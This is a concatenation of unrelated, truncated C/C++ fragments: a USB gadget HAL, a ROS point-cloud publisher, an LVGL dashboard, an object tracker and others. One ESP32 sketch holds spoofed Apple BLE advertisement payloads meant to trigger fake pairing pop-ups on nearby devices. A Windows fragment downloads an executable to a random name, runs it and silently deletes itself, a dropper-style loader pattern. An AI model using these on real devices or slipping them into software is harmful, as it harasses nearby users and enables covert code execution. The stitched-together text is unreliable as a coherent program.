usb {\nnamespace gadget {\nnamespace V1_1 {\nnamespace implementation {\n\nvolatile bool gadgetPullup;\n\n// Used for debug.\nstatic void displayInotifyEvent(struct inotify_event *i) {\n  ALOGE(\"    wd =%2d; \", i->wd);\n  if (i->cookie > 0) ALOGE(\"cookie =%4d; \", i->cookie);\n\n  ALOGE(\"mask = \");\n  if (i->mask & IN_ACCESS) ALOGE(\"IN_ACCESS \");\n  if (i->mask & IN_ATTRIB) ALOGE(\"IN_ATTRIB \");\n  if (i->mask & IN_CLOSE_NOWRITE) ALOGE(\"IN_CLOSE_NOWRITE \");\n  if (i->mask & IN_CLOSE_WRITE) ALOGE(\"IN_CLOSE_WRITE \");\n  if (i->mask & IN_CREATE) ALOGE(\"IN_CREATE \");\n  if (i->mask & IN_DELETE) ALOGE(\"IN_DELETE \");\n  if (i->mask & IN_DELETE_SELF) ALOGE(\"IN_DELETE_SELF \");\n  if (i->mask & IN_IGNORED) ALOGE(\"IN_IGNORED \");\n  if (i->mask & IN_ISDIR) ALOGE(\"IN_ISDIR \");\n  if (i->mask & IN_MODIFY) ALOGE(\"IN_MODIFY \");\n  if (i->mask & IN_MOVE_SELF) ALOGE(\"IN_MOVE_SELF \");\n  if (i->mask & IN_MOVED_FROM) ALOGE(\"IN_MOVED_FROM \");\n  if (i->mask & IN_MOVED_TO) ALOGE(\"IN_MOVED_TO \");\n  if (i->mask & IN_OPEN) ALOGE(\"IN_OPEN \");\n  if (i->mask & IN_Q_OVERFLOW) ALOGE(\"IN_Q_OVERFLOW \");\n  if (i->mask & IN_UNMOUNT) ALOGE(\"IN_UNMOUNT \");\n  ALOGE(\"\\n\");\n\n  if (i->len > 0) ALOGE(\"        name = %s\\n\", i->name);\n}\n\nstatic void *monitorFfs(void *param) {\n  UsbGadget *usbGadget = (UsbGadget *)param;\n  char buf[BUFFER_SIZE];\n  bool writeUdc = true, stopMonitor = false;\n  struct epoll_event events[EPOLL_EVENTS];\n  steady_clock::time_point disconnect;\n\n  bool descriptorWritten = true;\n  for (int i = 0; i < static_cast<int>(usbGadget->mEndpointList.size()); i++) {\n    if (access(usbGadget->mEndpointList.at(i).c_str(), R_OK)) {\n      descriptorWritten = false;\n      break;\n    }\n  }\n\n  // notify here if the endpoints are already present.\n  if (descriptorWritten) {\n    usleep(PULL_UP_DELAY);\n    if (!!WriteStringToFile(GADGET_NAME, PULLUP_PATH)) {\n      lock_guard<mutex> lock(usbGadget->mLock);\n      usbGadget->mCurrentUsbFunctionsApplied = true;\n      gadgetPullup = true;\n      writeUdc = false;\n      ALOGI(\"GADGET pulled up\");\n      usbGadget->mCv.notify_all();\n    }\n  }\n\n  while (!stopMonitor) {\n    int nrEvents = epoll_wait(usbGadget->mEpollFd, events, EPOLL_EVENTS, -1);\n\n    if (nrEvents <= 0) {\n      ALOGE(\"epoll wait did not return descriptor number\");\n      continue;\n    }\n\n    for (int i = 0; i < nrEvents; i++) {\n      ALOGI(\"event=%u on fd=%d\\n\", events[i].events, events[i].data.fd);\n\n      if (events[i].data.fd == usbGadget->mInotifyFd) {\n        // Process all of the events in buffer returned by read().\n        int numRead = read(usbGadget->mInotifyFd, buf, BUFFER_SIZE);\n        for (char *p = buf; p < buf + numRead;) {\n          struct inotify_event *event = (struct inotify_event *)p;\n          if (DEBUG) displayInotifyEvent(event);\n\n          p += sizeof(struct inotify_event) + event->len;\n\n          bool descriptorPresent = true;\n          for (int j = 0; j < static_cast<int>(usbGadget->mEndpointList.size());\n               j",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <chrono>\r\n#include <thread>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include \"resource-.h\"\r\n#include \"auth.hpp\"\r\n#include <string>\r\n#include \"utils.hpp\"\r\n#include \"skStr.h\"\r\n#include \"Protection.hpp\"\r\n#include <iostream>\r\n#include <Windows.h>\r\n#include <TlHelp32.h>\r\n#include <thread>\r\n#include <chrono>\r\n#include <iostream>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <WinINet.h>\r\n#include <fstream>\r\n#include <iostream>\r\n#include <sys/stat.h>\r\n#include <wchar.h>\r\n#include <Windows.h>\r\n#include <string>\r\n#include <iostream>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <vector>\r\n#include <string>\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <filesystem>\r\n#include <cstdlib>\r\n#include <iostream>\r\n#include <vector> // Added this line to include the vector header\r\n#include <filesystem>\r\n#include <iostream>\r\n#include <windows.h>\r\n#include <wininet.h>\r\n#pragma comment(lib, \"wininet.lib\")\r\n#pragma comment(lib, \"Wininet.lib\") // Link with WinINet library\r\n#include <string> // Include string header for std::wstring\r\n#include <Wininet.h> // Include WinINet header for Internet functions\r\n#include <iostream>\r\n#include <thread>\r\n#include <chrono>\r\n#include <Windows.h>\r\n#include <iostream>\r\n#include <string>\r\n#include <cstdlib> // For system()\r\n\r\n\r\n#pragma comment(lib, \"wininet.lib\")\r\nusing namespace std;\r\nnamespace fs = std::filesystem;\r\n\r\n\r\n\r\n\r\nbool DownloadFile(const std::wstring& url, const std::wstring& filePath) {\r\n\tHINTERNET hInternet = InternetOpenA(\"Download\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\r\n\tif (hInternet == NULL) {\r\n\t\tstd::cerr << \"Failed to initialize WinINet.\" << std::endl;\r\n\t\treturn false;\r\n\t}\r\n\r\n\t// Convert wide string URL to ANSI string\r\n\tstd::string urlA(url.begin(), url.end());\r\n\r\n\tHINTERNET hUrl = InternetOpenUrlA(hInternet, urlA.c_str(), NULL, 0, 0, 0);\r\n\tif (hUrl == NULL) {\r\n\t\tstd::cerr << \"Failed to open URL.\" << std::endl;\r\n\t\tInternetCloseHandle(hInternet);\r\n\t\treturn false;\r\n\t}\r\n\r\n\tstd::ofstream file(filePath, std::ios::binary);\r\n\tif (!file.is_open()) {\r\n\t\tstd::cerr << \"Failed to create file.\" << std::endl;\r\n\t\tInternetCloseHandle(hUrl);\r\n\t\tInternetCloseHandle(hInternet);\r\n\t\treturn false;\r\n\t}\r\n\r\n\tDWORD bytesRead = 0;\r\n\tchar buffer[1024];\r\n\twhile (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {\r\n\t\tfile.write(buffer, bytesRead);\r\n\t}\r\n\r\n\tfile.close();\r\n\tInternetCloseHandle(hUrl);\r\n\tInternetCloseHandle(hInternet);\r\n\treturn true;\r\n}\r\n\r\n\r\nnamespace fs = std::filesystem;\r\n\r\nbool checkFilesExist(const std::string& path, const std::vector<std::string>& filenames) {\r\n\tfor (const auto& filename : filenames) {\r\n\t\tif (!fs::exists(path + \"/\" + filename)) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n\treturn true;\r\n}\r\n\r\nbool fileExists(const std::wstring& filePath) {\r\n\tDWORD fileAttributes = GetFileAttributes(filePath.c_str());\r\n\treturn (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));\r\n}\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <wininet.h>\r\n#include <urlmon.h>\r\n#include <filesystem>\r\n#pragma comment(lib, \"urlmon.lib\")\r\n#include <random>\r\n#include <string>\r\n#include <random>  // Include <random> for C++11 random utilities\r\n#include <thread>  // Include <thread> for std::this_thread::sleep_for\r\n#include <chrono>\r\n\r\nstd::string random_string(size_t length) {\r\n\tstd::string GeneratedString;\r\n\tstatic const char Alphabet[] = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!?-_*&%$\";\r\n\tstd::random_device rd;\r\n\tstd::mt19937 gen(rd());\r\n\tstd::uniform_int_distribution<> dis(0, sizeof(Alphabet) - 2); // -2 to exclude '\\0'\r\n\tfor (size_t i = 0; i < length; i++)\r\n\t\tGeneratedString += Alphabet[dis(gen)];\r\n\treturn GeneratedString;\r\n}\r\n\r\n// Function to download file from URL\r\nbool download_file(const std::string& url, const std::string& dest) {\r\n\tHRESULT hr = URLDownloadToFileA(NULL, url.c_str(), dest.c_str(), 0, NULL);\r\n\treturn hr == S_OK;\r\n}\r\n\r\n// Function to get the executable path\r\nstd::string get_executable_path() {\r\n\tchar buffer[MAX_PATH];\r\n\tGetModuleFileNameA(NULL, buffer, MAX_PATH);\r\n\treturn std::string(buffer);\r\n}\r\n\r\n// Function to delete the current executable\r\nvoid delete_current_executable() {\r\n\tstd::string current_path = get_executable_path();\r\n\tstd::string command = \"/C choice /C Y /N /D Y /T 3 & Del \\\"\" + current_path + \"\\\"\";\r\n\tShellExecuteA(NULL, \"open\", \"cmd.exe\", command.c_str(), NULL, SW_HIDE);\r\n}\r\n\r\nvoid auto_update(const std::string& downloadLink) {\r\n\tstd::string current_path = get_executable_path();\r\n\tstd::string new_path = current_path.substr(0, current_path.find_last_of(\"\\\\/\") + 1); // Get directory path\r\n\r\n\tstd::string random_str = random_string(6); // Generate random string\r\n\r\n\tnew_path += random_str + \".exe\"; // Create new executable path with just the random string\r\n\r\n\tif (download_file(downloadLink, new_path)) {\r\n\t\tShellExecuteA(0, 0, new_path.c_str(), 0, 0, SW_SHOW);\r\n\t\tdelete_current_executable();\r\n\t\texit(0);\r\n\t}\r\n}\r\n\r\n#",
    "\ufeff#include \"RenderingEngine.h\"\n\n/**\n * EdgeHTML is a proprietary layout engine developed for the Microsoft Edge web browser, developed by Microsoft.\n */\nZCENUM_V(RenderingEngine, EDGE_HTML, \"EdgeHTML\");\n/**\n * Trident is the the Microsoft layout engine, mainly used by Internet Explorer.\n */\nZCENUM_V(RenderingEngine, TRIDENT, \"Trident\");\n/**\n * HTML parsing and rendering engine of Microsoft Office Word, used by some other products of the Office suite instead of Trident.\n */\nZCENUM_V(RenderingEngine, WORD, \"Microsoft Office Word\");\n/**\n * Open source and cross platform layout engine, used by Firefox and many other browsers.\n */\nZCENUM_V(RenderingEngine, GECKO, \"Gecko\");\n/**\n * Layout engine based on KHTML, used by Safari, Chrome and some other browsers.\n */\nZCENUM_V(RenderingEngine, WEBKIT, \"WebKit\");\n/**\n * Proprietary layout engine by Opera Software ASA\n */\nZCENUM_V(RenderingEngine, PRESTO, \"Presto\");\n/**\n * Original layout engine of the Mozilla browser and related products. Predecessor of Gecko.\n */\nZCENUM_V(RenderingEngine, MOZILLA, \"Mozilla\");\n/**\n * Layout engine of the KDE project\n */\nZCENUM_V(RenderingEngine, KHTML, \"KHTML\");\n/**\n * Other or unknown layout engine.\n */\nZCENUM_V(RenderingEngine, BLINK, \"Blink\");\n/**\n * Layout engine developed as part ofthe Chromium project. Fored from WebKit.\n */\nZCENUM_V(RenderingEngine, OTHER, \"Other\");\n\n",
    "#include <iostream>\n#include <ros/ros.h>\n#include <pcl/io/obj_io.h>\n#include <pcl_conversions/pcl_conversions.h>\n\nusing namespace std;\n\nint main(int argc, char** argv) {\n  ros::init(argc, argv, \"load_obj\");\n  ros::NodeHandle node(\"~\");\n\n  ros::Publisher cloud_pub = node.advertise<sensor_msgs::PointCloud2>(\"/load_obj/cloud\", 10);\n\n  pcl::PointCloud<pcl::PointXYZ> cloud;\n\n  // pcl::io::loadOBJFile(\"/home/boboyu/Downloads/AnyConv.com__truss_bridge.obj\", cloud);\n  pcl::io::loadPCDFile<pcl::PointXYZ>(\"/home/boboyu/Downloads/pp.pcd\", cloud);\n\n  cloud.width = cloud.points.size();\n  cloud.height = 1;\n  cloud.is_dense = true;\n  cloud.header.frame_id = \"world\";\n\n  // Rotate the cloud\n  for (int i = 0; i < cloud.points.size(); ++i) {\n    auto pt = cloud.points[i];\n    pcl::PointXYZ pr;\n    pr.x = pt.x;\n    pr.y = -pt.z;\n    pr.z = pt.y;\n    cloud.points[i] = pr;\n  }\n\n  sensor_msgs::PointCloud2 cloud2;\n  pcl::toROSMsg(cloud, cloud2);\n\n  while (ros::ok()) {\n    cloud_pub.publish(cloud2);\n    ros::Duration(0.2).sleep();\n  }\n\n  std::cout << \"Cloud published!\" << std::endl;\n\n  return 1;\n}\n",
    "requires a ESP32 Arduino\n\n\nint deviceType = 4; // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...\nint delaySeconds = 2; // delay in seconds\nint advType = 2; \n  // 0 - ADV_TYPE_IND\n  // 1 - ADV_TYPE_DIRECT_IND_HIGH (directed advertisement with high duty cycle)\n  // 2 - ADV_TYPE_SCAN_IND\n  // 3 - ADV_NONCONN_IND\n  // 4 - ADV_TYPE_DIRECT_IND_LOW (directed advertisement with low duty cycle)\n \nvoid setup() {\n  Serial.begin(115200);\n  Serial.println(\"Starting ESP32 BLE\");\n \n  BLEDevice::init(\"\");\n \n  BLEServer *pServer = BLEDevice::createServer();\n \n  pAdvertising = pServer->getAdvertising();\n  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();\n \n  uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n \n  uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataAirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; \n  uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataBeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n  uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};\n  uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};\n  uint8_t dataAppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};\n  uint8_t dataAppleTVAppleIDSetup[23] = {0x16, 0xff,",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint main(){\r\n    int myIntVar ;\r\n    float myFloatVar;\r\n    char myCharVar;\r\n    double myDoubleVar;\r\n    string myStringVar;\r\n    bool myBoolVar;\r\n    cout<<\"Enter an integer:\";\r\n    cin>>myIntVar;\r\n    cout<<\"Enter an float: \";\r\n    cin>>myFloatVar;\r\n    cout<<\"Enter an char: \";\r\n    cin>>myCharVar;\r\n    cout<<\"Enter an double: \";\r\n    cin>>myDoubleVar;\r\n    cout<<\"Enter an string: \";\r\n    cin>>myStringVar;\r\n    cout<<\"Enter an bool: \";\r\n    cin>>myBoolVar;\r\n    cout<<\"int is :\"<<myIntVar<<endl<<\"size of integer is \"<<sizeof(myIntVar)<<endl;\r\n    cout<<\"float is :\"<<myFloatVar<<endl<<\"size of float is \"<<sizeof(myFloatVar)<<endl;\r\n    cout<<\"char is :\"<<myCharVar<<endl<<\"size of character is \"<<sizeof(myCharVar)<<endl;\r\n    cout<<\"double is :\"<<myDoubleVar<<endl<<\"size of double is \"<<sizeof(myDoubleVar)<<endl;\r\n    cout<<\"string is :\"<<myStringVar<<endl<<\"size of string is \"<<sizeof(myStringVar)<<endl;\r\n    cout<<\"bool is :\"<<myBoolVar<<endl<<\"size of bool is \"<<sizeof(myBoolVar)<<endl;\r\n\r\n\r\n}\r\n\r\n/* EXPECTED OUTPUT\r\nEnter an integer:2\r\nEnter an float: 2.9\r\nEnter an char: A\r\nEnter an double: 2.999\r\nEnter an string: ARYAN\r\nEnter an bool: TRUE\r\nint is :2\r\nsize of integer is 4\r\nfloat is :2.9\r\nsize of float is 4\r\nchar is :A\r\nsize of character is 1\r\ndouble is :2.999\r\nsize of double is 8\r\nstring is :ARYAN\r\nsize of string is 32\r\nbool is :0\r\nsize of bool is 1 \r\n*/",
    "#include \"ui.h\"\n\n// UI initialisation\nvoid setup_ui()\n{\n    main_screen = lv_scr_act();\n    // Set the background color to black\n    // lv_obj_set_style_bg_color(lv_scr_act(), lv_color_black(), LV_PART_MAIN | LV_STATE_DEFAULT);\n    // lv_obj_set_style_bg_color(lv_scr_act(), lv_color_hex(0x003a57), LV_PART_MAIN | LV_STATE_DEFAULT);\n\n    // Create a container for the grid\n    lv_obj_t *cont = lv_obj_create(main_screen);\n    lv_obj_set_size(cont, lv_pct(100), lv_pct(100));\n    lv_obj_set_style_bg_color(cont, lv_color_make(10, 10, 10), LV_PART_MAIN | LV_STATE_DEFAULT);\n    lv_obj_set_flex_flow(cont, LV_FLEX_FLOW_ROW_WRAP);\n    lv_obj_set_scrollbar_mode(cont, LV_SCROLLBAR_MODE_OFF);\n\n    // Create Time widget\n    lv_obj_t *time_box = lv_obj_create(cont);\n    lv_obj_set_size(time_box, lv_pct(48), lv_pct(30));\n    lv_obj_set_style_border_width(time_box, 2, 0);\n    lv_obj_set_style_bg_color(time_box, lv_color_make(32, 32, 32), LV_PART_MAIN | LV_STATE_DEFAULT);\n    lv_obj_align(time_box, LV_ALIGN_TOP_LEFT, 5, 5);\n    lv_obj_set_scrollbar_mode(time_box, LV_SCROLLBAR_MODE_OFF);\n    time_label = lv_label_create(time_box);\n\n    lv_label_set_text(time_label, \"00:00\");\n    lv_obj_set_style_text_font(time_label, &lv_font_montserrat_20, 0);\n    lv_obj_set_style_text_color(time_label, lv_color_white(), LV_PART_MAIN | LV_STATE_DEFAULT);\n    lv_obj_center(time_label);\n\n    // Create Weather widget\n    lv_obj_t *weather_box = lv_obj_create(cont);\n    lv_obj_set_size(weather_box, lv_pct(48), lv_pct(30));\n    lv_obj_set_style_border_width(weather_box, 2, 0);\n    lv_obj_set_style_pad_top(weather_box, 8, 0);\n    lv_obj_set_style_bg_color(weather_box, lv_color_make(32, 32, 32), LV_PART_MAIN | LV_STATE_DEFAULT);\n    lv_obj_align(weather_box, LV_ALIGN_TOP_RIGHT, -5, 5);\n    lv_obj_set_scrollbar_mode(weather_box, LV_SCROLLBAR_MODE_OFF);\n\n    weather_label = lv_label_create(weather_box);\n    lv_label_set_text(weather_label, \"25\u00b0C\\n50%\");\n    lv_obj_set_style_text_font(weather_label, &lv_font_montserrat_20, 0);\n    lv_obj_set_style_text_color(weather_label, lv_color_white(), LV_PART_MAIN | LV_STATE_DEFAULT);\n    lv_obj_align(weather_label, LV_ALIGN_TOP_MID, 0, 0);\n\n    // Create Device widgets\n    for (int i = 0; i < 9; i++)\n    {\n        lv_obj_t *device_box = lv_obj_create(cont);\n        lv_obj_set_size(device_box, lv_pct(31), lv_pct(20));\n        lv_obj_set_style_border_width(device_box, 2, 0);\n        lv_obj_set_style_bg_color(device_box, lv_color_make(32, 32, 32), LV_PART_MAIN | LV_STATE_DEFAULT);\n        lv_obj_set_style_pad_all(device_box, 2, 0);\n        lv_obj_set_scrollbar_mode(device_box, LV_SCROLLBAR_MODE_OFF);\n\n        device_title[i] = lv_label_create(device_box);\n        lv_obj_set_style_text_font(device_title[i], &lv_font_montserrat_8, 0);\n        lv_obj_set_style_text_color(device_title[i], lv_color_white(), LV_PART_MAIN | LV_STATE_DEFAULT);\n        lv_label_set_text_fmt(device_title[i], \"Device %d\", i + 1);\n        lv_obj_align(device_title[i], LV_ALIGN_TOP_LEFT, 10, 0);\n\n        device_status_indicator[i] = lv_obj_create(device_box);\n        lv_obj_set_size(device_status_indicator[i], 8, 33);\n        lv_obj_set_style_radius(device_status_indicator[i], LV_RADIUS_CIRCLE, 0);\n\n        device_labels[i] = lv_label_create(device_box);\n        lv_obj_set_style_text_font(device_labels[i], &lv_font_montserrat_8, 0);\n        lv_obj_set_style_text_color(device_labels[i], lv_color_white(), LV_PART_MAIN | LV_STATE_DEFAULT);\n        lv_label_set_text(device_labels[i], \"Attribute 1\\nAttribute 2\");\n        lv_obj_align(device_labels[i], LV_ALIGN_TOP_LEFT, 10, 12);\n    }\n}\n\nvoid update_time(const char *time_str)\n{\n    lv_label_set_text(time_label, time_str);\n}\n\nvoid update_weather(const char *temp, const char *humidity)\n{\n    float temperature;\n    char formatted_temp[10]; // Buffer for formatted temperature\n\n    // Check if the temperature already contains a decimal point\n    if (strchr(temp, '.') != NULL)\n    {\n        temperature = atof(temp);\n    }\n    else\n    {\n        temperature = atof(temp) / 10.0;\n    }\n\n    snprintf(formatted_temp, sizeof(formatted_temp), \"%.1f\u00b0C\", temperature);\n\n    lv_label_set_text_fmt(weather_label, \"%s\\n%s%%\", formatted_temp, humidity);\n}\n\nvoid update_device(int device_index, bool is_online, const char *name, const char *attr1, const char *attr2)\n{\n    if (device_index >= 0 && device_index < 9)\n    {\n        lv_label_set_text_fmt(device_title[device_index], \"%s\", name);\n        lv_label_set_text_fmt(device_labels[device_index], \"%s\\n%s\", attr1, attr2);\n        lv_obj_set_style_bg_color(device_status_indicator[device_index], is_online ? lv_palette_main(LV_PALETTE_GREEN) : lv_palette_main(LV_PALETTE_RED), 0);\n    }\n}\n\nvoid updateWeatherDisplay(String currentTemp, String currentHumidity)\n{\n    Serial.println(\"Weather updated.\");\n    update_weather(currentTemp.c_str(), currentHumidity.c_str());\n}\n\nvoid updateTimeDisplay()\n{\n    struct tm timeinfo;\n    char time_str[9]; // HH:MM:SS\\0\n\n    getLocalTime(&timein",
    "#include \"byte_tracker.h\"\n#include <fstream>\n#include \"lapjv.h\"\n#include <InferResult.h>\n#include <Results.h>\n#include \"utils.h\"\n#include \"config.h\"\n#include <sensor_msgs/Image.h>\n#include <cv_bridge/cv_bridge.h>\n#include <ros/ros.h>\nBYTEtracker::BYTEtracker(int frame_rate, int track_buffer)\n{\n\ttrack_thresh = 0.5;\n\thigh_thresh = 0.6;\n\tmatch_thresh = 0.8;\n\n\tframe_id = 0;\n\tmax_time_lost = int(frame_rate / 30.0 * track_buffer);\n}\n\nBYTEtracker::~BYTEtracker()\n{\n}\n\nstd::vector<strack*> BYTEtracker::joint_stracks(std::vector<strack*> &tlista, std::vector<strack> &tlistb)\n{\n    std::map<int, int> exists;\n    std::vector<strack*> res;\n    for (int i = 0; i < tlista.size(); i++)\n    {\n        exists.insert(std::pair<int, int>(tlista[i]->track_id, 1));\n        res.push_back(tlista[i]);\n    }\n    for (int i = 0; i < tlistb.size(); i++)\n    {\n        int tid = tlistb[i].track_id;\n        if (!exists[tid] || exists.count(tid) == 0)\n        {\n            exists[tid] = 1;\n            res.push_back(&tlistb[i]);\n        }\n    }\n    return res;\n}\n\nstd::vector<strack> BYTEtracker::joint_stracks(std::vector<strack> &tlista, std::vector<strack> &tlistb)\n{\n    std::map<int, int> exists;\n    std::vector<strack> res;\n    for (int i = 0; i < tlista.size(); i++)\n    {\n        exists.insert(std::pair<int, int>(tlista[i].track_id, 1));\n        res.push_back(tlista[i]);\n    }\n    for (int i = 0; i < tlistb.size(); i++)\n    {\n        int tid = tlistb[i].track_id;\n        if (!exists[tid] || exists.count(tid) == 0)\n        {\n            exists[tid] = 1;\n            res.push_back(tlistb[i]);\n        }\n    }\n    return res;\n}\n\nstd::vector<strack> BYTEtracker::sub_stracks(std::vector<strack> &tlista, std::vector<strack> &tlistb)\n{\n    std::map<int, strack> stracks;\n    for (int i = 0; i < tlista.size(); i++)\n    {\n        stracks.insert(std::pair<int, strack>(tlista[i].track_id, tlista[i]));\n    }\n    for (int i = 0; i < tlistb.size(); i++)\n    {\n        int tid = tlistb[i].track_id;\n        if (stracks.count(tid) != 0)\n        {\n            stracks.erase(tid);\n        }\n    }\n\n    std::vector<strack> res;\n    std::map<int, strack>::iterator  it;\n    for (it = stracks.begin(); it != stracks.end(); ++it)\n    {\n        res.push_back(it->second);\n    }\n\n    return res;\n}\n\nvoid BYTEtracker::remove_duplicate_stracks(std::vector<strack> &resa, std::vector<strack> &resb, std::vector<strack> &stracksa, std::vector<strack> &stracksb)\n{\n    std::vector< std::vector<float> > pdist = iou_distance(stracksa, stracksb);\n    std::vector<std::pair<int, int> > 